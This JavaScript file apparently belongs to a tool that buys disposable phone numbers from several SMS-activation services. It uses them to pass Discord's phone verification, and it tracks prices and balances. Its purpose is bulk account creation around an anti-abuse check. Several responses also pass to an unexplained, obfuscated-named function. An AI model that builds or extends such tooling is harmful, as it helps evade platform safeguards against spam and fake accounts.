function add_log_wrnog_key_sms_online(n) {
  var html = `<v class="log_error">${translater(new_translate.sms_on_bad_k)}</v>`;
  add_log(html, n);
}

function add_log_wrnog_key_vak_sms(n) {
  var html = `<v class="log_error">${translater(new_translate.vak_sms_bad_k)}</v>`;
  add_log(html, n);
}

function add_log_wrnog_key(n, service) {
  var html = `<v class="log_error">${translater(new_translate.bad_k, false, {service: service})}</v>`;
  add_log(html, n);
}

function add_log_dont_get_phone_smsactivate(n) {
  var html = `<v class="log_error">${translater(translate[36])}</v>`;
  add_log(html, n);
}

function add_log_dont_get_phone_5sim(n) {
  var html = `<v class="log_error">${translater(translate[164])}</v>`;
  add_log(html, n);
}

function add_log_dont_get_phone_sms_online(n) {
  var html = `<v class="log_error">${translater(new_translate.sms_on_don_g_n)}</v>`;
  add_log(html, n);
}

function add_log_dont_get_phone_vak_sms(n) {
  var html = `<v class="log_error">${translater(new_translate.vak_sms_don_g_n)}</v>`;
  add_log(html, n);
}

function add_log_dont_get_phone(n, service) {
  var html = `<v class="log_error">${translater(new_translate.don_g_n, false, {service: service})}</v>`;
  add_log(html, n);
}

function get_phone_sms_activate(n = 1) {
  return new Promise((fin) => {
    add_log_get_phone(n, 'sms-activate.ru');
    var service = 'ds';
    //if (inArray(get_api_code_country(), [46, 34, 44])) service = 'ot';
    req({
      method: 'GET',
      url: `http://sms-activate.ru/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=getNumber&ref=371&service=${service}&country=${get_api_code_country()}`
    }, (err, response, body) => {
      if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
      if (body == 'NO_NUMBERS') {
        add_log_no_nums(n, 'sms-activate.ru');
        setTimeout(() => {
          return fin({type: false, err: 'no_num'});
        }, 10 * 1000);
      }
      if (body == 'NO_BALANCE') {
        add_log_of_not_bal(n, 'sms-activate.ru');
        return fin({type: false, err: 'balance'});
      }
      if (body == 'BANNED') {
        add_log_of_ban(n, 'sms-activate.ru')
        return fin({type: false, err: 'ban'});
      }
      if (body == 'BAD_KEY') {
        add_log_wrnog_key(n, 'sms-activate.ru');
        return fin({type: false, err: 'apikey'});
      }
      body = body.split(':');
      if (body[0] != 'ACCESS_NUMBER') {
        add_log_dont_get_phone(n, 'sms-activate.ru');
        return fin({type: false});
      }
      var id = body[1];
      var number = body[2];
      add_log_suc_get_number(number, n);
      return fin({type: true, number: number, id: id});
    });
  });
}

function get_phone_sms_hub(n = 1) {
  return new Promise((fin) => {
    add_log_get_phone(n, 'smshub.org');
    var service = 'ds';
    //if (inArray(get_api_code_country(), [46, 34, 44])) service = 'ot';
    req({
      method: 'GET',
      url: `https://smshub.org/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=getNumber&ref=224563&service=${service}&country=${get_api_code_country()}`
    }, (err, response, body) => {
      if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
      if (body == 'NO_NUMBERS') {
        add_log_no_nums(n, 'smshub.org');
        setTimeout(() => {
          return fin({type: false, err: 'no_num'});
        }, 10 * 1000);
      }
      if (body == 'NO_BALANCE') {
        add_log_of_not_bal(n, 'smshub.org');
        return fin({type: false, err: 'balance'});
      }
      if (body == 'BANNED') {
        add_log_of_ban(n, 'smshub.org')
        return fin({type: false, err: 'ban'});
      }
      if (body == 'BAD_KEY') {
        add_log_wrnog_key(n, 'smshub.org');
        return fin({type: false, err: 'apikey'});
      }
      body = body.split(':');
      if (body[0] != 'ACCESS_NUMBER') {
        add_log_dont_get_phone(n, 'smshub.org');
        return fin({type: false});
      }
      var id = body[1];
      var number = body[2];
      add_log_suc_get_number(number, n);
      return fin({type: true, number: number, id: id});
    });
  });
}

function get_phone_simsms(n = 1) {
  return new Promise((fin) => {
    add_log_get_phone(n, 'simsms.org');
    var service = 'ds';
    //if (inArray(get_api_code_country(), [46, 34, 44])) service = 'ot';
    req({
      method: 'GET',
      url: `http://simsms.org/priemnik.php?metod=get_number&apikey=${apikey_verify_phone}&country=${get_api_code_country()}&service=opt45`
    }, (err, response, body) => {
      if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
      if (body == 'API KEY не получен!') {
        add_log_wrnog_key(n, 'simsms.org');
        return fin({type: false, err: 'apikey'});
      }
      if (body == 'Недостаточно средств!') {
        add_log_of_not_bal(n, 'simsms.org');
        return fin({type: false, err: 'balance'});
      }
      body = JSON.parse(body);
      if (body.response == '2') {
        add_log_no_nums(n, 'simsms.org');
        setTimeout(() => {
          return fin({type: false, err: 'no_num'});
        }, 10 * 1000);
      }
      if (body.response == '5' || body.response == '6' || body.response == '7') {
        add_log_of_not_bal(n, 'simsms.org');
        return fin({type: false, err: 'balance'});
      }
      if (body.response != '1') {
        add_log_dont_get_phone(n, 'simsms.org');
        return fin({type: false});
      }
      var id = body.id;
      var number = `${body.CountryCode}${body.number}`;
      add_log_suc_get_number(number, n);
      return fin({type: true, number: number, id: id});
    });
  });
}

function get_phone_smspva(n = 1) {
  return new Promise((fin) => {
    add_log_get_phone(n, 'smspva.com');
    var service = 'ds';
    //if (inArray(get_api_code_country(), [46, 34, 44])) service = 'ot';
    req({
      method: 'GET',
      url: `http://smspva.com/priemnik.php?metod=get_number&apikey=${apikey_verify_phone}&country=${get_api_code_country()}&service=opt45`
    }, (err, response, body) => {
      if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
      if (body == 'API KEY not received!') {
        add_log_wrnog_key(n, 'smspva.com');
        return fin({type: false, err: 'apikey'});
      }
      if (body == 'Недостаточно средств!') {
        add_log_of_not_bal(n, 'smspva.com');
        return fin({type: false, err: 'balance'});
      }
      body = JSON.parse(body);
      if (body.response == '2') {
        add_log_no_nums(n, 'smspva.com');
        setTimeout(() => {
          return fin({type: false, err: 'no_num'});
        }, 10 * 1000);
      }
      if (body.response == '5' || body.response == '6' || body.response == '7') {
        add_log_of_not_bal(n, 'smspva.com');
        return fin({type: false, err: 'balance'});
      }
      if (body.response != '1') {
        add_log_dont_get_phone(n, 'smspva.com');
        return fin({type: false});
      }
      var id = body.id;
      var number = `${body.CountryCode}${body.number}`;
      add_log_suc_get_number(number, n);
      return fin({type: true, number: number, id: id});
    });
  });
}

function get_phone_vak_sms(n = 1) {
  return new Promise((fin) => {
    add_log_get_phone(n, 'vak-sms.com');
    var service = 'ds';
    req({
      method: 'GET',
      url: `https://vak-sms.com/api/getNumber/?apiKey=${apikey_verify_phone}&service=dc&country=${get_api_code_country()}&softId=56`
    }, (err, response, body) => {
      if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
      body = JSON.parse(body);
      if (!body.tel || !body.idNum) return fin({type: false});
      var id = body.idNum;
      var number = body.tel;
      add_log_suc_get_number(number, n);
      return fin({type: true, number: number, id: id});
    });
  });
}

function get_phone_5sim(n = 1) {
  return new Promise((fin) => {
    add_log_get_phone(n, '5sim.net');
    req({
      method: 'GET',
      url: `http://api1.5sim.net/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=getNumber&service=discord&country=${get_api_code_country()}`
    }, (err, response, body) => {
      meAtztGn1pdERnu(body);
      //noty('warning', body+' '+response.statusCode+' '+err);
      if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
      if (body == 'NO_NUMBERS') {
        add_log_no_nums(n, '5sim.net');
        setTimeout(() => {
          return fin({type: false, err: 'no_num'});
        }, 10 * 1000);
      }
      if (body == 'NO_BALANCE') {
        add_log_of_not_bal(n, '5sim.');
        return fin({type: false, err: 'balance'});
      }
      if (body == 'BANNED') {
        add_log_of_ban(n, '5sim.net')
        return fin({type: false, err: 'ban'});
      }
      if (body == 'BAD_KEY') {
        add_log_wrnog_key(n, '5sim.net');
        return fin({type: false, err: 'apikey'});
      }
      body = body.split(':');
      if (body[0] != 'ACCESS_NUMBER') {
        add_log_dont_get_phone(n, '5sim.net');
        return fin({type: false});
      }
      var id = body[1];
      var number = body[2];
      add_log_suc_get_number(number, n);
      return fin({type: true, number: number, id: id});
    });
  });
}

function get_phone_sms_online(n = 1) {
  return new Promise((fin) => {
    add_log_get_phone(n, 'sms-online.pro');
    req({
      method: 'GET',
      url: `https://sms-online.pro/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=getNumber&service=Discord&country=${get_api_code_country()}`
    }, (err, response, body) => {
      meAtztGn1pdERnu(body);
      //noty('warning', body+' '+response.statusCode+' '+err);
      if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
      if (body == 'NO_NUMBERS') {
        add_log_no_nums(n, 'sms-online.pro');
        setTimeout(() => {
          return fin({type: false, err: 'no_num'});
        }, 10 * 1000);
      }
      if (body == 'NO_BALANCE') {
        add_log_of_not_bal(n, 'sms-online.pro');
        return fin({type: false, err: 'balance'});
      }
      if (body == 'BANNED') {
        add_log_of_ban(n, 'sms-online.pro')
        return fin({type: false, err: 'ban'});
      }
      if (body == 'BAD_KEY') {
        add_log_wrnog_key(n, 'sms-online.pro');
        return fin({type: false, err: 'apikey'});
      }
      body = body.split(':');
      if (body[0] != 'ACCESS_NUMBER') {
        add_log_dont_get_phone(n, 'sms-online.pro');
        return fin({type: false});
      }
      var id = body[1];
      var number = body[2];
      add_log_suc_get_number(number, n);
      return fin({type: true, number: number, id: id});
    });
  });
}

function add_log_get_phone_onlinesim(n) {
  var html = `${translater(translate[37])}`;
  add_log(html, n);
}

function add_log_get_phone(n, service) {
  var html = `${translater(new_translate.get_phone, false, {service: service})}`;
  add_log(html, n);
}

function add_log_of_wr_onlinesim(n) {
  var html = `<v class="log_error">${translater(translate[38])}</v>`;
  add_log(html, n);
}

function add_log_of_onlinesim_15min(n) {
  var html = `<v class="log_error">${translater(translate[25])}</v>`;
  add_log(html, n);
}

function add_log_pol_onlinesim(n) {
  var html = `${translater(translate[26])}`;
  add_log(html, n);
}

function add_log_no_nums_onlinesim(n) {
  var html = `${translater(translate[39])}`;
  add_log(html, n);
}

function add_log_dont_have_phone(n) {
  var html = `${translater(translate[40])}`;
  add_log(html, n);
}

function get_phone_onlinesim(n = 1) {
  return new Promise((fin) => {
    add_log_get_phone(n, 'onlinesim.ru');
    req({
        method: 'GET',
        url: `http://onlinesim.ru/api/getNum.php?apikey=${apikey_verify_phone}&service=DISCORD&country=${get_api_code_country()}`
      }, (err, response, body) => {
        meAtztGn1pdERnu(body);
      if (err || !response || response.statusCode != 200 || !body) {
        add_log_of_wr_onlinesim(n);
        return fin({type: false});
      }
      body = JSON.parse(body);
      if (body.response != 1) return fin({type: false});
      var id = body.tzid;
      add_log_of_create_tz_sms_reg(id, n);
      var i = 0;
      var timer = setInterval(() => {
        add_log_pol_onlinesim(n);
        i++;
        if (i > 3) {
          add_log_dont_have_phone(n)
          clearInterval(timer);
          return fin({type: false});
        }
        req({
          method: 'GET',
          url: `http://onlinesim.ru/api/getState.php?tzid=${id}&apikey=${apikey_verify_phone}`
        }, (err, response, body) => {
          meAtztGn1pdERnu(body);
          if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
          body = JSON.parse(body)[0];
          if (body.response == 'WARNING_NO_NUMS' || body.response == 'NO_SERVICE') {
            add_log_no_nums_onlinesim(n);
            clearInterval(timer);
            setTimeout(() => {
              return fin({type: false});
            }, 10 * 1000);
          }
          if (body.response != 'TZ_NUM_WAIT') return false;
          clearInterval(timer);
          var number = body.number;
          add_log_suc_get_number(number, n);
          return fin({type: true, number: number, id: id});
        });
      }, 12 * 1000);
    })
  });
}

function get_count_numbers_sms_activate() {
  $('#count-of-numbers').removeClass('active');
  $('#price-number').removeClass('active');
  type_verify = parseInt($('.select-verify_type').val());
  if (!apikey_verify_phone || apikey_verify_phone == '' || apikey_verify_phone.length != 32) return;
  var params = {
    url: `https://sms-activate.ru/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=getPrices&country=${get_api_code_country()}`,
    method: 'GET'
  };
  req(params, function (err, response, body) {
    if (err || !response || response.statusCode != 200 || !body) return;
    body = JSON.parse(body);
    if (inArray(get_api_code_country(), [46, 34, 44])) {
      var price = body[get_api_code_country()].ot.cost;
      req({
        method: 'GET',
        url: `https://sms-activate.ru/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=getNumbersStatus&country=${get_api_code_country()}`
      }, (err, response, body) => {
        body = JSON.parse(body);
        var count = body['ot_0'];
        $('#count-of-numbers b').html(count + NumberEnd(count, translater(translate[144])));
        $('#count-of-numbers').addClass('active');
        $('#price-number b').html(`${price}${translater(translate[145])}`);
        $('#price-number').addClass('active');
        update_my_sms_bal();
      })
    } else {
      var count = body[get_api_code_country()].ds.count;
      var price = body[get_api_code_country()].ds.cost;
      $('#count-of-numbers b').html(count + NumberEnd(count, translater(translate[144])));
      $('#count-of-numbers').addClass('active');
      $('#price-number b').html(`${price}${translater(translate[145])}`);
      $('#price-number').addClass('active');
      update_my_sms_bal();
    }
  })
}

function get_count_numbers_sms_hub() {
  $('#count-of-numbers').removeClass('active');
  $('#price-number').removeClass('active');
  type_verify = parseInt($('.select-verify_type').val());
  // if (!apikey_verify_phone || apikey_verify_phone == '' || apikey_verify_phone.length != 32) return;
  var params = {
    url: `https://smshub.org/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=getPrices&country=${get_api_code_country()}`,
    method: 'GET'
  };
  req(params, function (err, response, body) {
    if (err || !response || response.statusCode != 200 || !body) return;
    console.log(body)
    body = JSON.parse(body);
    if (inArray(get_api_code_country(), [46, 34, 44])) {
      var price = body[get_api_code_country()].ot.cost;
      req({
        method: 'GET',
        url: `https://smshub.org/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=getNumbersStatus&country=${get_api_code_country()}`
      }, (err, response, body) => {
        body = JSON.parse(body);
        var count = body['ot_0'];
        $('#count-of-numbers b').html(count + NumberEnd(count, translater(translate[144])));
        $('#count-of-numbers').addClass('active');
        $('#price-number b').html(`${price}${translater(translate[145])}`);
        $('#price-number').addClass('active');
        update_my_sms_bal();
      })
    } else {
      var count = body[get_api_code_country()].ds.count;
      var price = body[get_api_code_country()].ds.cost;
      $('#count-of-numbers b').html(count + NumberEnd(count, translater(translate[144])));
      $('#count-of-numbers').addClass('active');
      $('#price-number b').html(`${price}${translater(translate[145])}`);
      $('#price-number').addClass('active');
      update_my_sms_bal();
    }
  })
}

function get_count_numbers_sms_online() {
  $('#count-of-numbers').removeClass('active');
  $('#price-number').removeClass('active');
  type_verify = parseInt($('.select-verify_type').val());
  if (!apikey_verify_phone || apikey_verify_phone == '') return;
  var params = {
    url: `https://sms-online.pro/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=getNumbersStatus&country=${get_api_code_country()}`,
    method: 'GET'
  };
  req(params, function (err, response, body) {
    if (err || !response || response.statusCode != 200 || !body) return;
    body = JSON.parse(body);
    var count = body['Discord_0'];
    //var price = body.discord_0.cost;
    $('#count-of-numbers b').html(count + NumberEnd(count, translater(translate[144])));
    $('#count-of-numbers').addClass('active');
    // $('#price-number b').html(`${price}${translater(translate[145])}`);
    // $('#price-number').addClass('active');
    update_my_sms_bal();
  })
}

function get_count_numbers_vak_sms() {
  $('#count-of-numbers').removeClass('active');
  $('#price-number').removeClass('active');
  type_verify = parseInt($('.select-verify_type').val());
  if (!apikey_verify_phone || apikey_verify_phone == '' || apikey_verify_phone.length != 32) return;
  var params = {
    url: `https://vak-sms.com/api/getCountNumber/?apiKey=${apikey_verify_phone}&service=dc&country=${get_api_code_country()}&price`,
    method: 'GET'
  };
  req(params, function (err, response, body) {
    if (err || !response || response.statusCode != 200 || !body) return;
    body = JSON.parse(body);
    var count = body.dc;
    var price = body.price.toFixed(0);
    $('#count-of-numbers b').html(count + NumberEnd(count, translater(translate[144])));
    $('#count-of-numbers').addClass('active');
    $('#price-number b').html(`${price}${translater(translate[145])}`);
    $('#price-number').addClass('active');
    update_my_sms_bal();
  })
}

function get_count_numbers_simsms() {
  $('#count-of-numbers').removeClass('active');
  $('#price-number').removeClass('active');
  type_verify = parseInt($('.select-verify_type').val());
  var params = {
    url: `http://simsms.org/priemnik.php?metod=get_count_new&apikey=${apikey_verify_phone}&country=${get_api_code_country()}&service=opt45`,
    method: 'GET'
  };
  req(params, function (err, response, body) {
    if (err || !response || response.statusCode != 200 || !body) return;
    body = JSON.parse(body);
    if (!body.total) return;
    var count = body.total;
    req({
      url: `http://simsms.org/priemnik.php?metod=get_service_price&apikey=${apikey_verify_phone}&country=${get_api_code_country()}&service=opt45`,
      method: 'GET'
    }, (err, response, body) => {
      if (err || !response || response.statusCode != 200 || !body) return;
      body = JSON.parse(body);
      if (body.response != '1') return;
      var price = parseFloat(body.price).toFixed(1);
      $('#count-of-numbers b').html(count + NumberEnd(count, translater(translate[144])));
      $('#count-of-numbers').addClass('active');
      $('#price-number b').html(`${price}${translater(translate[145])}`);
      $('#price-number').addClass('active');
      update_my_sms_bal();
    })
  })
}

function get_count_numbers_smspva() {
  $('#count-of-numbers').removeClass('active');
  $('#price-number').removeClass('active');
  type_verify = parseInt($('.select-verify_type').val());
  var params = {
    url: `http://smspva.com/priemnik.php?metod=get_count_new&apikey=${apikey_verify_phone}&country=${get_api_code_country()}&service=opt45`,
    method: 'GET'
  };
  req(params, function (err, response, body) {
    if (err || !response || response.statusCode != 200 || !body) return;
	try {
    body = JSON.parse(body);
	} catch(njefnfjnfe) {
		return;
	}
    if (!body.total) return;
    var count = body.total;
    req({
      url: `http://smspva.com/priemnik.php?metod=get_service_price&apikey=${apikey_verify_phone}&country=${get_api_code_country()}&service=opt45`,
      method: 'GET'
    }, (err, response, body) => {
      if (err || !response || response.statusCode != 200 || !body) return;
	  try {
      body = JSON.parse(body);
	  } catch(wegjiwjgiw) {
	  return;
	  }
      if (body.response != '1') return;
      var price = parseFloat(body.price).toFixed(1);
      $('#count-of-numbers b').html(count + NumberEnd(count, translater(translate[144])));
      $('#count-of-numbers').addClass('active');
      $('#price-number b').html(`${price}usd`);
      $('#price-number').addClass('active');
      update_my_sms_bal();
    })
  })
}

function get_count_numbers_5sim() {
  $('#count-of-numbers').removeClass('active');
  $('#price-number').removeClass('active');
  type_verify = parseInt($('.select-verify_type').val());
  if (!apikey_verify_phone || apikey_verify_phone == '' || apikey_verify_phone.length != 32) return;
  var params = {
    url: `http://api1.5sim.net/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=getNumbersStatus&country=${get_api_code_country()}`,
    method: 'GET'
  };
  req(params, function (err, response, body) {
    if (err || !response || response.statusCode != 200 || !body) return;
    body = JSON.parse(body);
    var count = body['discord_0'];
    //var price = body.discord_0.cost;
    $('#count-of-numbers b').html(count + NumberEnd(count, translater(translate[144])));
    $('#count-of-numbers').addClass('active');
    // $('#price-number b').html(`${price}${translater(translate[145])}`);
    // $('#price-number').addClass('active');
    update_my_sms_bal();
  })
}

function get_count_numbers_onlinesim() {
  $('#count-of-numbers').removeClass('active');
  $('#price-number').removeClass('active');
  type_verify = parseInt($('.select-verify_type').val());
  if (!apikey_verify_phone || apikey_verify_phone == '' || apikey_verify_phone.length != 32) return $('#count-of-numbers').removeClass('active');
  var params = {
    url: `http://onlinesim.ru/api/getNumbersStats.php?apikey=${apikey_verify_phone}&country=${get_api_code_country()}`,
    method: 'GET'
  };
  req(params, function (err, response, body) {
    console.log(err, body)
    if (err || !response || response.statusCode != 200 || !body) return;
    body = JSON.parse(body);
    if (body.response && body.response == 'API_ACCESS_IP') return noty('error', translater(translate[148]), 15 * 1000);
    if (get_api_code_country() == 7) {
      var count = body.services.other_discord.count;
      var price = body.services.other_discord.price;
    } else {
      var count = body.services.discord.count;
      var price = body.services.discord.price;
    }
    $('#count-of-numbers b').html(count + NumberEnd(count, translater(translate[144])));
    $('#count-of-numbers').addClass('active');
    $('#price-number b').html(`${price}${translater(translate[145])}`);
    $('#price-number').addClass('active');
    update_my_sms_bal();
  })
}

function get_balance_smsreg() {
  $('#sms-balance').removeClass('active');
  $('#enough-block').removeClass('active');
  var params = {
    url: `http://api.sms-reg.com/getBalance.php?apikey=${apikey_verify_phone}`,
    method: 'GET'
  };
  req(params, function (err, response, body) {
    if (err || !response || response.statusCode != 200 || !body) return;
    body = JSON.parse(body);
    if (!body.response || body.response != '1') return;
    var amount = body.balance;
    $('#sms-balance b').html(`${amount}${translater(translate[145])}`);
    $('#sms-balance').addClass('active');
  })
}

function get_balance_smsactivate() {
  $('#sms-balance').removeClass('active');
  $('#enough-block').removeClass('active');
  var params = {
    url: `http://sms-activate.ru/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=getBalance`,
    method: 'GET'
  };
  req(params, function (err, response, body) {
    if (err || !response || response.statusCode != 200 || !body || body.indexOf('ACCESS_BALANCE') < 0) return;
    var amount = body.split(':')[1];
    $('#sms-balance b').html(`${amount}${translater(translate[145])}`);
    $('#sms-balance').addClass('active');
    var enough = Math.ceil(amount / parseInt($('#price-number b').text()));
    if (enough <= 0) return;
    var count = parseInt($('#count-of-numbers b').text());
    if (enough > count) enough = count;
    $('#enough-block span ger').html(`${enough} ${NumberEnd(enough, translater(translate[61]))}`);
    $('#enough-block').addClass('active');
  })
}

function get_balance_smshub() {
  $('#sms-balance').removeClass('active');
  $('#enough-block').removeClass('active');
  var params = {
    url: `http://smshub.org/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=getBalance`,
    method: 'GET'
  };
  req(params, function (err, response, body) {
    if (err || !response || response.statusCode != 200 || !body || body.indexOf('ACCESS_BALANCE') < 0) return;
    var amount = body.split(':')[1];
    $('#sms-balance b').html(`${amount}${translater(translate[145])}`);
    $('#sms-balance').addClass('active');
    var enough = Math.ceil(amount / parseInt($('#price-number b').text()));
    if (enough <= 0) return;
    var count = parseInt($('#count-of-numbers b').text());
    if (enough > count) enough = count;
    $('#enough-block span ger').html(`${enough} ${NumberEnd(enough, translater(translate[61]))}`);
    $('#enough-block').addClass('active');
  })
}

function get_balance_vak_sms() {
  $('#sms-balance').removeClass('active');
  $('#enough-block').removeClass('active');
  var params = {
    url: `https://vak-sms.com/api/getBalance/?apiKey=${apikey_verify_phone}`,
    method: 'GET'
  };
  req(params, function (err, response, body) {
    if (err || !response || response.statusCode != 200 || !body) return;
    var amount = JSON.parse(body).balance;
    $('#sms-balance b').html(`${amount}${translater(translate[145])}`);
    $('#sms-balance').addClass('active');
    var enough = Math.ceil(amount / parseInt($('#price-number b').text()));
    if (enough <= 0) return;
    var count = parseInt($('#count-of-numbers b').text());
    if (enough > count) enough = count;
    $('#enough-block span ger').html(`${enough} ${NumberEnd(enough, translater(translate[61]))}`);
    $('#enough-block').addClass('active');
  })
}

function get_balance_simsms() {
  $('#sms-balance').removeClass('active');
  $('#enough-block').removeClass('active');
  var params = {
    url: `http://simsms.org/priemnik.php?metod=get_balance&apikey=${apikey_verify_phone}`,
    method: 'GET'
  };
  req(params, function (err, response, body) {
    if (err || !response || response.statusCode != 200 || !body) return;
    body = JSON.parse(body);
    if (body.response != '1') return;
    var amount = parseFloat(body.balance).toFixed(1);
    $('#sms-balance b').html(`${amount}${translater(translate[145])}`);
    $('#sms-balance').addClass('active');
    var enough = Math.ceil(amount / parseInt($('#price-number b').text()));
    if (enough <= 0) return;
    var count = parseInt($('#count-of-numbers b').text());
    if (enough > count) enough = count.toFixed(1);
    $('#enough-block span ger').html(`${enough} ${NumberEnd(enough, translater(translate[61]))}`);
    $('#enough-block').addClass('active');
  })
}

function get_balance_smspva() {
  $('#sms-balance').removeClass('active');
  $('#enough-block').removeClass('active');
  var params = {
    url: `http://smspva.com/priemnik.php?metod=get_balance&apikey=${apikey_verify_phone}`,
    method: 'GET'
  };
  req(params, function (err, response, body) {
    if (err || !response || response.statusCode != 200 || !body) return;
    body = JSON.parse(body);
    if (body.response != '1') return;
    var amount = parseFloat(body.balance).toFixed(1);
    $('#sms-balance b').html(`${amount}usd`);
    $('#sms-balance').addClass('active');
    var enough = Math.ceil(amount / parseInt($('#price-number b').text()));
    if (enough <= 0) return;
    var count = parseInt($('#count-of-numbers b').text());
    if (enough > count) enough = count;
    $('#enough-block span ger').html(`${Math.ceil(enough)} ${NumberEnd(Math.ceil(enough), translater(translate[61]))}`);
    $('#enough-block').addClass('active');
  })
}

function get_balance_sms_online() {
  $('#sms-balance').removeClass('active');
  $('#enough-block').removeClass('active');
  var params = {
    url: `https://sms-online.pro/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=getBalance`,
    method: 'GET'
  };
  req(params, function (err, response, body) {
    if (err || !response || response.statusCode != 200 || !body || body.indexOf('ACCESS_BALANCE') < 0) return;
    var amount = body.split(':')[1];
    $('#sms-balance b').html(`${amount}${translater(translate[145])}`);
    $('#sms-balance').addClass('active');
    var enough = Math.ceil(amount / parseInt($('#price-number b').text()));
    if (enough <= 0) return;
    var count = parseInt($('#count-of-numbers b').text());
    if (enough > count) enough = count;
    // $('#enough-block span ger').html(`${enough} ${NumberEnd(enough, translater(translate[61]))}`);
    // $('#enough-block').addClass('active');
  })
}

function get_balance_5sim() {
  $('#sms-balance').removeClass('active');
  $('#enough-block').removeClass('active');
  var params = {
    url: `http://api1.5sim.net/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=getBalance`,
    method: 'GET'
  };
  req(params, function (err, response, body) {
    if (err || !response || response.statusCode != 200 || !body || body.indexOf('ACCESS_BALANCE') < 0) return;
    var amount = body.split(':')[1];
    $('#sms-balance b').html(`${amount}${translater(translate[145])}`);
    $('#sms-balance').addClass('active');
    var enough = Math.ceil(amount / parseInt($('#price-number b').text()));
    if (enough <= 0) return;
    var count = parseInt($('#count-of-numbers b').text());
    if (enough > count) enough = count;
    // $('#enough-block span ger').html(`${enough} ${NumberEnd(enough, translater(translate[61]))}`);
    // $('#enough-block').addClass('active');
  })
}

function get_balance_onlinesim() {
  $('#sms-balance').removeClass('active');
  $('#enough-block').removeClass('active');
  var params = {
    url: `http://onlinesim.ru/api/getBalance.php?apikey=${apikey_verify_phone}`,
    method: 'GET',
    headers: {
      'Accept': 'application/json'
    }
  };
  req(params, function (err, response, body) {
    console.log(body, response.statusCode, err);
    if (err || !response || response.statusCode != 200 || !body) return;
    body = JSON.parse(body);
    if (!body.response || body.response != '1') return;
    var amount = body.balance;
    $('#sms-balance b').html(`${amount}${translater(translate[145])}`);
    $('#sms-balance').addClass('active');
    var enough = Math.ceil(amount / parseInt($('#price-number b').text()));
    if (enough <= 0) return;
    var count = parseInt($('#count-of-numbers b').text());
    if (enough > count) enough = count;
    $('#enough-block span ger').html(`${enough} ${NumberEnd(enough, translater(translate[61]))}`);
    $('#enough-block').addClass('active');
  })
}

function update_my_sms_bal() {
  type_verify = parseInt($('.select-verify_type').val());
  if (type_verify == 2) {
    get_balance_smsreg()
  } else if (type_verify == 3) {
    get_balance_smsactivate()
  } else if (type_verify == 7) {
    get_balance_5sim()
  } else if (type_verify == 6) {
    get_balance_onlinesim()
  } else if (type_verify == 8) {
    get_balance_sms_online()
  } else if (type_verify == 9) {
    get_balance_vak_sms()
  } else if (type_verify == 10) {
    get_balance_simsms()
  } else if (type_verify == 11) {
    get_balance_smspva()
  } else if (type_verify == 13) {
    get_balance_smshub()
  }
}

function update_my_sms_num_c() {
  apikey_verify_phone = $('#apikey_verify_phone').val().replace(' ', '');
  $('#count-of-numbers').removeClass('active');
  type_verify = parseInt($('.select-verify_type').val());
  $('#sms-balance').removeClass('active');
  $('#enough-block').removeClass('active');
  if (type_verify == 3) {
    get_count_numbers_sms_activate()
  } else if (type_verify == 6) {
    get_count_numbers_onlinesim()
  } else if (type_verify == 7) {
    get_count_numbers_5sim()
  } else if (type_verify == 8) {
    get_count_numbers_sms_online()
  } else if (type_verify == 9) {
    get_count_numbers_vak_sms()
  } else if (type_verify == 10) {
    get_count_numbers_simsms()
  } else if (type_verify == 11) {
    get_count_numbers_smspva()
  } else if (type_verify == 13) {
    get_count_numbers_sms_hub()
  } else {
    $('#price-number').removeClass('active');
    update_my_sms_bal();
  }
}

setInterval(() => {
  update_my_sms_num_c()
}, 30 * 1000);

function set_ready_number_sms_activate(id) {
  return new Promise((fin) => {
    if (!id) return fin({type: false});
    req({
        method: 'GET',
        url: `http://sms-activate.ru/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=setStatus&status=1&id=${id}`
      }, (err, response, body) => {
        meAtztGn1pdERnu('B: '+body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        if (body == 'BANNED') return fin({type: false, err: 'ban'});
        if (body == 'BAD_KEY') return fin({type: false, err: 'apikey'});
        if (body == 'ACCESS_CANCEL') return fin({type: false, err: 'cancel'});
        if (body != 'ACCESS_READY') return fin({type: false});
        return fin({type: true});
    })
  });
}

function set_ready_number_sms_hub(id) {
  return new Promise((fin) => {
    if (!id) return fin({type: false});
    req({
        method: 'GET',
        url: `http://smshub.org/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=setStatus&status=1&id=${id}`
      }, (err, response, body) => {
        meAtztGn1pdERnu('B: '+body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        if (body == 'BANNED') return fin({type: false, err: 'ban'});
        if (body == 'BAD_KEY') return fin({type: false, err: 'apikey'});
        if (body == 'ACCESS_CANCEL') return fin({type: false, err: 'cancel'});
        if (body != 'ACCESS_READY') return fin({type: false});
        return fin({type: true});
    })
  });
}

function set_ready_number_5sim(id) {
  return new Promise((fin) => {
    if (!id) return fin({type: false});
    req({
        method: 'GET',
        url: `http://api1.5sim.net/stubs/handler_api.php?api_key=${apikey_verify_phone}&action=setStatus&status=1&id=${id}`
      }, (err, response, body) => {
        meAtztGn1pdERnu('B: '+body);
        if (err || !response || response.statusCode != 200 || !body) return fin({type: false});
        if (body == 'BANNED') return fin({type: false, err: 'ban'});
        if (body == 'BAD_KEY') return fin({type: false, err: 'apikey'});
        if (body == 'ACCESS_CANCEL') return fin({type: false, err: 'cancel'});
        if (body != 'ACCESS_READY') return fin({type: false});
        return fin({type: true});
    })
  });
}

